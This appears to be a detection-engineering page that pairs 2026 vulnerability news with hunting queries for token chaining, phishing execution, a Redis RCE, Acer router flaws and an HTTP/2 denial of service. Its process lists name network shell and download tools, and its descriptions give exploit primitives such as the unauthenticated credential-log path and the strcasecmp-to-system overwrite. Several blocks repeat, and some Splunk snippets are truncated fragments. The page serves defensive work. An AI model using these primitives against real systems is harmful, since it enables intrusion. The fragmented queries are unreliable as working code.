[LLM] FOCI cross-app token chaining: one Android device authenticates to 3+ affected Office mobile apps Actions on Objectives Medium
FOCI's distinguishing property is that one stolen refresh token mints access tokens for any sibling app in the family. A real user typically interacts with one or two Office apps in a 30-minute window; a FlagLeft attacker programmatically pivots Word→Excel→PowerPoint→OneNote→Copilot to enumerate what the victim has access to. This catches that fan-out pattern from a single unmanaged Android session. Rationale: FOCI's family-refresh design is the unique enabler here — one stolen FRT yields tokens for ANY family member. The attacker's enumeration looks like cross-app sign-ins in tight succession from one device context, which legitimate mobile usage rarely produces (a user picks one app and stays in it). Threshold of 3 distinct apps in 30 min is the empirical sweet spot; lower it for higher-confidence tenants.
ATT&CKT1550.001 T1528
Data sourcesAuthentication.Authentication
// FlagLeft chaining — single unmanaged Android session fans out across 3+ FOCI sibling apps in 30 min
AADSignInEventsBeta
| where Timestamp > ago(1d)
| where OSPlatform =~ "Android"
| where Application in~ ("Microsoft Word","Microsoft PowerPoint","Microsoft Excel","Microsoft 365 Copilot","Microsoft OneNote","Microsoft Loop","Microsoft Office")
| where ErrorCode == 0
| where (DeviceTrustType !in~ ("Compliant","Managed","AzureAd","Workplace")) or isempty(DeviceTrustType)
| where AccountUpn !endswith "$"
| summarize AppFanOut = dcount(Application),
            Apps = make_set(Application),
            DistinctIPs = make_set(IPAddress, 5),
            DistinctUAs = make_set(UserAgent, 5),
            FirstSeen = min(Timestamp),
            LastSeen = max(Timestamp),
            SignInCount = count()
            by AccountUpn, AadDeviceId, bin(Timestamp, 30m)
| where AppFanOut >= 3                  // 3+ FOCI family apps within 30 min — empirical threshold; real users rarely cross-pivot this fast on mobile
| order by AppFanOut desc, LastSeen desc
// FlagLeft chaining — single unmanaged Android session fans out across 3+ FOCI sibling apps in 30 min
let AffectedApps = dynamic(["Microsoft Word","Microsoft PowerPoint","Microsoft Excel","Microsoft 365 Copilot","Microsoft OneNote","Microsoft Loop","Microsoft Office"]);
union isfuzzy=true
  (SigninLogs | where TimeGenerated > ago(1d)),
  (AADNonInteractiveUserSignInLogs | where TimeGenerated > ago(1d))
| where AppDisplayName in~ (AffectedApps)
| extend DeviceOS = tostring(DeviceDetail.operatingSystem),
         DeviceIsCompliant = tobool(DeviceDetail.isCompliant),
         DeviceIsManaged = tobool(DeviceDetail.isManaged),
         DeviceIdParsed = tostring(DeviceDetail.deviceId)
| where DeviceOS has "Android"
| where ResultType == 0
| where (DeviceIsCompliant != true) and (DeviceIsManaged != true)
| summarize AppFanOut = dcount(AppDisplayName),
            Apps = make_set(AppDisplayName),
            DistinctIPs = make_set(IPAddress, 5),
            DistinctUAs = make_set(UserAgent, 5),
            FirstSeen = min(TimeGenerated),
            LastSeen  = max(TimeGenerated),
            SignInCount = count()
            by UserPrincipalName, DeviceIdParsed, bin(TimeGenerated, 30m)
| where AppFanOut >= 3                   // 3+ FOCI family apps within 30 min — empirical threshold for cross-app token chaining
| order by AppFanOut desc, LastSeen desc
source:azure.activeDirectory @evt.name:"Sign-in activity" @properties.appDisplayName:("Microsoft Word" OR "Microsoft PowerPoint" OR "Microsoft Excel" OR "Microsoft 365 Copilot" OR "Microsoft OneNote" OR "Microsoft Loop" OR "Microsoft Office") @properties.deviceDetail.operatingSystem:Android @properties.status.errorCode:0 -@properties.deviceDetail.isCompliant:true -@properties.deviceDetail.isManaged:true
#event_simpleName=IdpAuthenticationLog
| AppDisplayName=/(Microsoft (Word|PowerPoint|Excel|OneNote|Loop|Office)|Microsoft 365 Copilot)/i
| DeviceOperatingSystem=/android/i
| ResultType=0
| NOT DeviceTrustType=/(Compliant|Managed|AzureAd|Workplace)/i
| groupBy([UserPrincipalName, DeviceId], function={ AppFanOut := count(field=AppDisplayName, distinct=true) | Apps := collect(AppDisplayName) | SignInCount := count() })
| AppFanOut >= 3

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc

| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`

    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")

                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user

What 345 Days of Untested Exposure Looks Like at a Bank

BleepingComputer
2026-06-03 4 use cases 2 techniques 4 kill-chain phases detected

A two-week penetration test can leave roughly 345 days of real-world exposure unvalidated. Sprocket Security explores why continuous testing is becoming critical as attack surfaces constantly change. [...]

ATT&CKT1190 T1566

Actions on Objectives
Likely
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking. → Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

    from datamodel=Email.All_Email

    [| tstats `summariesonly` count

          AND Processes.process_name IN ("cmd.exe","powershell.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe")
        by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
     | rename Processes.user as user]
| tstats summariesonly=false count

    by All_Email.src_user, All_Email.recipient, All_Email.file_name, All_Email.subject

Autonomous AI Tool Finds 2-Year-Old RCE Flaw in Redis (CVE-2026-23479)

The Hacker News
2026-06-03 8 use cases 5 techniques 4 kill-chain phases detected

Redis has patched a use-after-free in its blocking-client code that lets an authenticated user run arbitrary OS commands on the machine hosting the database. The flaw was found by an autonomous AI tool built to hunt bugs in large codebases. Tracked as CVE-2026-23479, the flaw was introduced in Redis 7.2.0 and remained in every stable branch until the May 5 fixes, unnoticed for over two years.

[LLM] Redis-server process spawning shell or scripting interpreter (CVE-2026-23479 RCE) Exploitation High
Hunts the terminal stage of the CVE-2026-23479 exploit chain: the use-after-free in unblockClientOnKey() ultimately repoints strcasecmp() to system() via a GOT overwrite, so the next Redis command is executed as a shell command. Any child process of redis-server that is a shell, scripting interpreter, or download tool is a high-fidelity indicator of in-the-wild exploitation. Rationale: Article describes that the GOT overwrite repoints strcasecmp() to system(), so 'the next command Redis parses runs as a shell command.' That child shell will be parented to redis-server in EDR telemetry — an extremely rare event in any legitimate Redis deployment. No second source needed: the parent-child relationship is a direct consequence of the published exploit chain. Cross-checked against: • https://www.wiz.io/blog/redis-cve-2026-23479-uaf • https://nvd.nist.gov/vuln/detail/CVE-2026-23479
ATT&CKT1190 T1059.004 T1203
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("redis-server","redis-server.exe")
   or InitiatingProcessFolderPath endswith "/redis-server"
   or InitiatingProcessFolderPath endswith "\\redis-server.exe"
| where FileName in~ ("sh","bash","dash","zsh","ksh","cmd.exe","powershell.exe","pwsh.exe","wget","curl","nc","ncat","socat","python","python3","perl","ruby","php")
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          SHA256
| order by Timestamp desc
imProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName endswith "/redis-server" or ParentProcessName endswith "\\redis-server.exe" or ParentProcessName =~ "redis-server" or ParentProcessName =~ "redis-server.exe"
| where ActingProcessName has_any ("/sh","/bash","/dash","/zsh","/ksh","\\cmd.exe","\\powershell.exe","\\pwsh.exe","/wget","/curl","/nc","/ncat","/socat","/python","/python3","/perl","/ruby","/php")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

[LLM] Vulnerable Redis versions exposed to CVE-2026-23479 (TVM inventory pivot) Reconnaissance High
Surfaces every managed host running a Redis version in the vulnerable range (7.2.0-7.2.13, 7.4.0-7.4.8, 8.2.0-8.2.5, 8.4.0-8.4.2, 8.6.0-8.6.2) so the SOC can drive emergency patching and tighten ACLs before the public exploit chain is weaponised. Vulnerability is authenticated-only but the article highlights that most cloud Redis deployments use the default user with all required ACL categories. Rationale: Article tables the exact vulnerable/fixed version ranges per branch. TVM-based hunting is the cleanest way to drive emergency patching before public PoC is weaponised; pivot via IsInternetFacing because the article highlights cloud-exposed Redis as the primary at-risk surface. Cross-checked against: • https://github.com/redis/redis/security/advisories • https://nvd.nist.gov/vuln/detail/CVE-2026-23479

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc

2026-06-03 3 use cases 0 techniques 5 kill-chain phases detected

Acer is working to address two maximum-severity zero-day vulnerabilities affecting its Wave 7 mesh routers. [...]

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Acer Wave 7 unauthenticated acer_cgi.log credential disclosure (CVE-2026-49200)
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Acer Wave 7 upload.cgi backup tamper for persistent backdoor (CVE-2026-49201)
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
[LLM] Acer Wave 7 unauthenticated acer_cgi.log credential disclosure (CVE-2026-49200) Exploitation High
Hunts HTTP requests to the /acer_cgi.log endpoint on Acer Wave 7 mesh routers (admin URLs http://192.168.76.1 / http://acerconnect.com). This file is reachable without auth and contains cleartext web + Telnet credentials, so any GET to that exact path is the entire CVE-2026-49200 exploit primitive. Rationale: The article explicitly names acer_cgi.log as the unauthenticated file containing cleartext web + Telnet credentials (CVE-2026-49200). Pivoting on that exact URI substring catches every PoC and exploit attempt with effectively zero benign traffic since the file is not a normal user-facing resource. Cross-referenced with the admin endpoints 192.168.76.1 and acerconnect.com given in the article body to scope to actual Acer Wave 7 targets. No external corroboration searched — same-day vendor advisory referenced in article body.
ATT&CKT1190 T1552.001 T1083
Data sourcesWeb.Web Network_Traffic.All_Traffic
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteUrl has "acer_cgi.log"
   or (RemoteUrl has_any ("acerconnect.com", "192.168.76.1") and AdditionalFields has "acer_cgi.log")
| project Timestamp, DeviceName, DeviceId, RemoteIP, RemoteUrl, RemotePort,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessAccountName, InitiatingProcessAccountDomain
| order by Timestamp desc
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where isnotempty(RequestURL)
| where RequestURL has "acer_cgi.log"
| extend AdminTarget = iff(DestinationIP == "192.168.76.1" or DestinationHostName has "acerconnect.com", "acer-admin", "other")
| project TimeGenerated, SourceIP, SourceUserName, DestinationIP, DestinationHostName,
          RequestURL, RequestMethod, DeviceVendor, DeviceProduct, ReceivedBytes, SentBytes,
          RequestClientApplication, AdminTarget
| order by TimeGenerated desc

[LLM] Acer Wave 7 upload.cgi backup tamper for persistent backdoor (CVE-2026-49201) Installation Medium
Hunts POST requests to /upload.cgi on Acer Wave 7 routers carrying re-encrypted system backups. CVE-2026-49201 leaks a hardcoded AES key in upload.cgi that lets an attacker decrypt, modify (inject backdoor) and re-encrypt a backup so the device persists the implant on restore. Suspicious-shape POSTs to that endpoint from non-admin sources are the only on-wire artefact of the exploit. Rationale: Article identifies upload.cgi as the backup-processing binary holding the hardcoded AES key (CVE-2026-49201). POST is the only HTTP method consistent with the documented backup upload/restore action; pairing path + method + admin-destination (192.168.76.1 / acerconnect.com) tightens to the actual exploit primitive. Bytes-in floor (>1024) screens out probing or empty form submissions. Falcon and CloudWatch left empty — Falcon FDR doesn't carry HTTP URL paths, and the telemetry is web/network not AWS-native.
ATT&CKT1601.002 T1554 T1190
Data sourcesWeb.Web Network_Traffic.All_Traffic
DeviceNetworkEvents
| where Timestamp > ago(14d)
| where RemoteUrl has "upload.cgi"
   or (RemoteUrl has_any ("acerconnect.com", "192.168.76.1") and AdditionalFields has "upload.cgi")
| project Timestamp, DeviceName, DeviceId, RemoteIP, RemoteUrl, RemotePort,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessAccountName, InitiatingProcessAccountDomain,
          InitiatingProcessParentFileName
| order by Timestamp desc
CommonSecurityLog
| where TimeGenerated > ago(14d)
| where isnotempty(RequestURL)
| where RequestURL has "upload.cgi"
| where RequestMethod =~ "POST"
| extend BackupBytes = toint(ReceivedBytes)
| extend AdminTarget = iff(DestinationIP == "192.168.76.1" or DestinationHostName has "acerconnect.com", "acer-admin", "other")
| where AdminTarget == "acer-admin" or BackupBytes > 1024
| project TimeGenerated, SourceIP, SourceUserName, DestinationIP, DestinationHostName,
          RequestURL, RequestMethod, BackupBytes, SentBytes, DeviceVendor, DeviceProduct,
          RequestClientApplication, AdminTarget
| order by TimeGenerated desc

[LLM] HTTP/2 Bomb inbound exploitation: zero-window slow-hold against NGINX/Apache/IIS/Envoy/Pingora Exploitation Medium
Hunts the HTTP/2 Bomb attack pattern: a small number of source IPs opening long-lived HTTP/2 (h2/h2c) sessions to a web server on 80/443/8080/8443 while sending unusually low inbound bytes — the signature of a HEADERS-frame storm paired with a zero-byte INITIAL_WINDOW_SIZE / 1-byte WINDOW_UPDATE drip that pins HPACK per-entry allocations indefinitely. Article-specific anchor: low-bandwidth source (~100 Mbps), seconds-to-minutes hold, single source can pin 32 GB on Apache HTTPD/Envoy in ~20s. Rationale: Anchors on Calif's HTTP/2 Bomb mechanics described in the article: low-bandwidth source pinning a server for >20s with many cheap requests yielding minimal bytes-in and zero/near-zero bytes-out (because the zero-window hold prevents response DATA frames). The vulnerable-process list (nginx/httpd/w3wp/envoy/pingora) matches the named affected stacks. Cross-checked with the Calif blog post and oss-sec disclosure. Cross-checked against: • https://blog.calif.io/p/codex-discovered-a-hidden-http2-bomb • https://www.openwall.com/lists/oss-security/2026/06/03/3 • https://github.com/califio/publications/blob/main/MADBugs/http2-bomb/nginx/README.md
ATT&CKT1190 T1499.003 T1499.004

| where LocalPort in (80,443,8080,8443)
| summarize ConnCount=count(), DistinctSrcPorts=dcount(RemotePort), FirstSeen=min(Timestamp), LastSeen=max(Timestamp) by DeviceName, RemoteIP, InitiatingProcessFileName, LocalPort
| extend WindowSec = datetime_diff('second', LastSeen, FirstSeen)
| where ConnCount > 100 and DistinctSrcPorts > 50 and WindowSec > 120
| order by ConnCount desc

